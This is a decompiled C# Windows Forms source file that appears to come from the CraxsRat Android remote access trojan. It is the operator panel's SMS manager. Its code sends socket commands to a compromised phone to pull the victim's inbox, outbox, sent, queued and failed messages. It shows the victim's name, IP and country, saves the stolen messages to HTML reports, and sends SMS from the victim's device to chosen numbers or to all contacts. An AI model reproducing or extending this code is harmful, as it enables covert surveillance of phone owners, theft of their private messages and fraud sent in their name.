using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using DrakeUI.Framework;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

// Token: 0x020000C1 RID: 193
[DesignerGenerated]
public partial class SMSManager : Form
{
	// Token: 0x06000855 RID: 2133 RVA: 0x000C6BA4 File Offset: 0x000C4DA4
	public SMSManager()
	{
		base.Load += this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsqazfghs;
		base.Closing += this.SMSManager_Closing;
		base.Activated += this.AngelAndroidForm_Activated;
		base.Deactivate += this.AngelAndroidForm_Deactivate;
		this.Title = "null";
		this.BoxTitlePaintEventArgsWait = false;
		this.InitializeComponent();
	}

	// Token: 0x06000858 RID: 2136 RVA: 0x000C7F84 File Offset: 0x000C6184
	private void TOpacity_Tick(object sender, EventArgs e)
	{
		if (base.Opacity != 1.0)
		{
			base.Opacity += 0.1;
		}
		else
		{
			this.TOpacity.Enabled = false;
		}
	}

	// Token: 0x06000859 RID: 2137 RVA: 0x000C7FCC File Offset: 0x000C61CC
	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsqazfghs(object sender, EventArgs e)
	{
		base.Icon = new Icon(reso.res_Path + "\\Icons\\win\\14.ico");
		try
		{
			this.ClientPic.Image = this.classClient.Wallpaper;
			this.clinameinfo.Text = string.Concat(new string[]
			{
				"Name: ",
				this.classClient.ClientName,
				Strings.Space(2),
				"IP: ",
				this.classClient.ClientAddressIP,
				Strings.Space(2),
				"Country: ",
				this.classClient.Country
			});
		}
		catch (Exception)
		{
		}
		((ToolStripDropDownMenu)this.PathsToolStripMenuItem.DropDown).ShowImageMargin = false;
		((ToolStripDropDownMenu)this.PathsToolStripMenuItem.DropDown).BackColor = this.ctx.BackColor;
		this.DGV0.ColumnHeadersDefaultCellStyle.Font = reso.f;
		this.DGV0.DefaultCellStyle.Font = reso.f;
		if (Operators.CompareString(SpySettings.SAVING_DATA, "No", false) == 0)
		{
			this.SaveToolStripMenuItem.Visible = true;
			this.SaveAsToolStripMenuItem.Visible = true;
		}
		this.Text = this.Title;
		this.TOpacity.Interval = SpySettings.T_Interval;
		this.TOpacity.Enabled = true;
		this.BoxTitlePaintEventArgsWait = true;
	}

	// Token: 0x0600085A RID: 2138 RVA: 0x0000206C File Offset: 0x0000026C
	private void DGV0_CellContentClick(object sender, DataGridViewCellEventArgs e)
	{
	}

	// Token: 0x0600085B RID: 2139 RVA: 0x000C8144 File Offset: 0x000C6344
	private void DGV0_CellClick(object sender, DataGridViewCellEventArgs e)
	{
		if (e.RowIndex != -1 & e.ColumnIndex != -1)
		{
			this.SelectMessage(e.RowIndex);
		}
	}

	// Token: 0x0600085C RID: 2140 RVA: 0x000C8144 File Offset: 0x000C6344
	private void DGV0_RowEnter(object sender, DataGridViewCellEventArgs e)
	{
		if (e.RowIndex != -1 & e.ColumnIndex != -1)
		{
			this.SelectMessage(e.RowIndex);
		}
	}

	// Token: 0x0600085D RID: 2141 RVA: 0x000C8178 File Offset: 0x000C6378
	private void SelectMessage(int index)
	{
		if (index != -1)
		{
			this.showtext.Text = Conversions.ToString(this.DGV0.Rows[index].Tag);
		}
	}

	// Token: 0x0600085E RID: 2142 RVA: 0x0000206C File Offset: 0x0000026C
	private void SMSManager_Closing(object sender, CancelEventArgs e)
	{
	}

	// Token: 0x0600085F RID: 2143 RVA: 0x000C81B4 File Offset: 0x000C63B4
	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsxsxcauyb(string v)
	{
		if (this.classClient != null)
		{
			object[] parametersObjects = new object[]
			{
				this.Client,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient1,
					Data.SPL_SOCKET,
					reso.domen,
					".sms",
					Data.SPL_SOCKET,
					"method",
					Data.SPL_SOCKET,
					SecurityKey.getSMS,
					Data.SPL_SOCKET,
					"sms",
					Data.SPL_DATA,
					v
				}),
				Codes.Encoding().GetBytes("null"),
				this.classClient
			};
			this.classClient.SendMessage(parametersObjects);
		}
	}

	// Token: 0x06000860 RID: 2144 RVA: 0x000036EC File Offset: 0x000018EC
	private void AllToolStripMenuItem_Click(object sender, EventArgs e)
	{
		this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsxsxcauyb("content://sms/");
	}

	// Token: 0x06000861 RID: 2145 RVA: 0x000036F9 File Offset: 0x000018F9
	private void OutboxToolStripMenuItem_Click(object sender, EventArgs e)
	{
		this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsxsxcauyb("content://sms/outbox");
	}

	// Token: 0x06000862 RID: 2146 RVA: 0x00003706 File Offset: 0x00001906
	private void InboxToolStripMenuItem_Click(object sender, EventArgs e)
	{
		this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsxsxcauyb("content://sms/inbox");
	}

	// Token: 0x06000863 RID: 2147 RVA: 0x00003713 File Offset: 0x00001913
	private void SentToolStripMenuItem_Click(object sender, EventArgs e)
	{
		this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsxsxcauyb("content://sms/sent");
	}

	// Token: 0x06000864 RID: 2148 RVA: 0x00003720 File Offset: 0x00001920
	private void QueuedToolStripMenuItem_Click(object sender, EventArgs e)
	{
		this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsxsxcauyb("content://sms/queued");
	}

	// Token: 0x06000865 RID: 2149 RVA: 0x0000372D File Offset: 0x0000192D
	private void FailedToolStripMenuItem_Click(object sender, EventArgs e)
	{
		this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsxsxcauyb("content://sms/failed");
	}

	// Token: 0x06000866 RID: 2150 RVA: 0x000C8274 File Offset: 0x000C6474
	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsjufrswas(object sender, EventArgs e)
	{
		SaveFileDialog saveFileDialog = new SaveFileDialog();
		saveFileDialog.FileName = DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".html";
		saveFileDialog.Filter = "html (*.html)|*.html";
		if (saveFileDialog.ShowDialog() == DialogResult.OK)
		{
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				reso.SAVEit((Array)a0);
			}, new object[]
			{
				this.DGV0,
				"null",
				saveFileDialog.FileName,
				this.tmpClientName,
				this.tmpCountry + " - " + this.tmpAddressIP,
				"SMS",
				"sms",
				"null"
			});
		}
		saveFileDialog.Dispose();
	}

	// Token: 0x06000867 RID: 2151 RVA: 0x000C8348 File Offset: 0x000C6548
	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatszxcytrqa(object sender, EventArgs e)
	{
		reso.Directory_Exist(this.classClient);
		ThreadPool.QueueUserWorkItem(delegate(object a0)
		{
			reso.SAVEit((Array)a0);
		}, new object[]
		{
			this.DGV0,
			this.tmpFolderUSER,
			"SMS Manager",
			this.tmpClientName,
			this.tmpCountry + " - " + this.tmpAddressIP,
			"SMS",
			"sms",
			DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".html"
		});
	}

	// Token: 0x06000868 RID: 2152 RVA: 0x000C83F8 File Offset: 0x000C65F8
	private void BoxTitle_Paint(object sender, PaintEventArgs e)
	{
		checked
		{
			if (this.BoxTitlePaintEventArgsWait)
			{
				int count = this.DGV0.Rows.Count;
				string str = "All " + Conversions.ToString(count);
				string str2 = "Selected " + Conversions.ToString(this.DGV0.SelectedRows.Count);
				Color defaultColor_Foreground = SpySettings.DefaultColor_Foreground;
				e.Graphics.DrawLine(new Pen(Color.FromArgb(50, (int)defaultColor_Foreground.R, (int)defaultColor_Foreground.G, (int)defaultColor_Foreground.B)), 0, 1, this.BoxTitle.Width, 1);
				Brush brush = new SolidBrush(SpySettings.DefaultColor_Foreground);
				Brush brush2 = new SolidBrush(Color.FromArgb(170, (int)this.BoxTitle.BackColor.R, (int)this.BoxTitle.BackColor.G, (int)this.BoxTitle.BackColor.B));
				Size size = TextRenderer.MeasureText(str + Strings.Space(10) + str2, reso.f);
				Rectangle rect = new Rectangle(0, 2, this.BoxTitle.Width, size.Height + 5);
				e.Graphics.FillRectangle(new Pen(brush2).Brush, rect);
				e.Graphics.DrawString(str + Strings.Space(10) + str2 + Strings.Space(10), reso.f, brush, 0f, 2f);
				Size size2 = TextRenderer.MeasureText("S", reso.f);
				if (this.BoxTitle.Height != size2.Height + 3)
				{
					this.BoxTitle.Height = size2.Height + 3;
				}
			}
		}
	}

	// Token: 0x06000869 RID: 2153 RVA: 0x0000373A File Offset: 0x0000193A
	private void AngelAndroidForm_Activated(object sender, EventArgs e)
	{
		this.BoxTitle.Invalidate();
	}

	// Token: 0x0600086A RID: 2154 RVA: 0x0000373A File Offset: 0x0000193A
	private void AngelAndroidForm_Deactivate(object sender, EventArgs e)
	{
		this.BoxTitle.Invalidate();
	}

	// Token: 0x0600086B RID: 2155 RVA: 0x0000373A File Offset: 0x0000193A
	private void BoxTitle_Resize(object sender, EventArgs e)
	{
		this.BoxTitle.Invalidate();
	}

	// Token: 0x0600086C RID: 2156 RVA: 0x0000206C File Offset: 0x0000026C
	private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
	{
	}

	// Token: 0x0600086D RID: 2157 RVA: 0x000C85C4 File Offset: 0x000C67C4
	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsqwsakartx(object sender, EventArgs e)
	{
		checked
		{
			try
			{
				if (this.classClient != null)
				{
					smsMaker smsMaker = new smsMaker();
					if (smsMaker.ShowDialog() == DialogResult.OK && smsMaker.numslist.Items.Count > 0)
					{
						string text = smsMaker.msgtext.Text;
						TcpClient myClient = this.classClient.myClient;
						string[] array = this.classClient.Keys.Split(new char[]
						{
							':'
						});
						int value = 0;
						int value2 = 0;
						if (smsMaker.checkall.Checked)
						{
							object[] parametersObjects = new object[]
							{
								myClient,
								string.Concat(new string[]
								{
									SecurityKey.KeysClient2,
									Data.SPL_SOCKET,
									"ssms<*>all<>",
									text,
									"#",
									Data.SPL_SOCKET,
									array[0],
									Data.SPL_SOCKET,
									array[1],
									Data.SPL_SOCKET,
									SecurityKey.Lockscreen,
									Data.SPL_SOCKET,
									Conversions.ToString(value),
									Data.SPL_SOCKET,
									Conversions.ToString(value2),
									Data.SPL_SOCKET,
									Data.SPL_ARRAY,
									Data.SPL_SOCKET,
									this.classClient.ClientRemoteAddress
								}),
								Codes.Encoding().GetBytes("null"),
								this.classClient
							};
							this.classClient.SendMessage(parametersObjects);
						}
						else
						{
							int num = smsMaker.numslist.Items.Count - 1;
							for (int i = 0; i <= num; i++)
							{
								string text2 = Conversions.ToString(smsMaker.numslist.Items[i]);
								if (!(string.IsNullOrEmpty(text2) | string.IsNullOrWhiteSpace(text2)))
								{
									object[] parametersObjects2 = new object[]
									{
										myClient,
										string.Concat(new string[]
										{
											SecurityKey.KeysClient2,
											Data.SPL_SOCKET,
											"ssms<*>",
											text2,
											"#",
											text,
											Data.SPL_SOCKET,
											array[0],
											Data.SPL_SOCKET,
											array[1],
											Data.SPL_SOCKET,
											SecurityKey.Lockscreen,
											Data.SPL_SOCKET,
											Conversions.ToString(value),
											Data.SPL_SOCKET,
											Conversions.ToString(value2),
											Data.SPL_SOCKET,
											Data.SPL_ARRAY,
											Data.SPL_SOCKET,
											this.classClient.ClientRemoteAddress
										}),
										Codes.Encoding().GetBytes("null"),
										this.classClient
									};
									this.classClient.SendMessage(parametersObjects2);
								}
							}
						}
						EagleAlert.ShowSucess("your message was sent successfully");
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x0600086E RID: 2158 RVA: 0x0000373A File Offset: 0x0000193A
	private void DGV0_RowsRemoved(object sender, DataGridViewRowsRemovedEventArgs e)
	{
		this.BoxTitle.Invalidate();
	}

	// Token: 0x0600086F RID: 2159 RVA: 0x0000373A File Offset: 0x0000193A
	private void DGV0_RowsAdded(object sender, DataGridViewRowsAddedEventArgs e)
	{
		this.BoxTitle.Invalidate();
	}

	// Token: 0x06000870 RID: 2160 RVA: 0x0000373A File Offset: 0x0000193A
	private void DGV0_SelectionChanged(object sender, EventArgs e)
	{
		this.BoxTitle.Invalidate();
	}

	// Token: 0x04000C4A RID: 3146
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DGV0")]
	private DataGridView _DGV0;

	// Token: 0x04000C4B RID: 3147
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("AllToolStripMenuItem")]
	private ToolStripMenuItem _AllToolStripMenuItem;

	// Token: 0x04000C4C RID: 3148
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("OutboxToolStripMenuItem")]
	private ToolStripMenuItem _OutboxToolStripMenuItem;

	// Token: 0x04000C4D RID: 3149
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("InboxToolStripMenuItem")]
	private ToolStripMenuItem _InboxToolStripMenuItem;

	// Token: 0x04000C4E RID: 3150
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("SentToolStripMenuItem")]
	private ToolStripMenuItem _SentToolStripMenuItem;

	// Token: 0x04000C4F RID: 3151
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("QueuedToolStripMenuItem")]
	private ToolStripMenuItem _QueuedToolStripMenuItem;

	// Token: 0x04000C50 RID: 3152
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("FailedToolStripMenuItem")]
	private ToolStripMenuItem _FailedToolStripMenuItem;

	// Token: 0x04000C51 RID: 3153
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("SaveToolStripMenuItem")]
	private ToolStripMenuItem _SaveToolStripMenuItem;

	// Token: 0x04000C52 RID: 3154
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("SaveAsToolStripMenuItem")]
	private ToolStripMenuItem _SaveAsToolStripMenuItem;

	// Token: 0x04000C53 RID: 3155
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("TOpacity")]
	private System.Windows.Forms.Timer _TOpacity;

	// Token: 0x04000C54 RID: 3156
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("BoxTitle")]
	private PictureBox _BoxTitle;

	// Token: 0x04000C55 RID: 3157
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIAvatar1")]
	private DrakeUIAvatar _DrakeUIAvatar1;

	// Token: 0x04000C56 RID: 3158
	public TcpClient Client;

	// Token: 0x04000C57 RID: 3159
	public Client classClient;

	// Token: 0x04000C58 RID: 3160
	public string Title;

	// Token: 0x04000C59 RID: 3161
	public string tmpFolderUSER;

	// Token: 0x04000C5A RID: 3162
	public string tmpClientName;

	// Token: 0x04000C5B RID: 3163
	public string tmpCountry;

	// Token: 0x04000C5C RID: 3164
	public string tmpAddressIP;

	// Token: 0x04000C5D RID: 3165
	private bool BoxTitlePaintEventArgsWait;
}
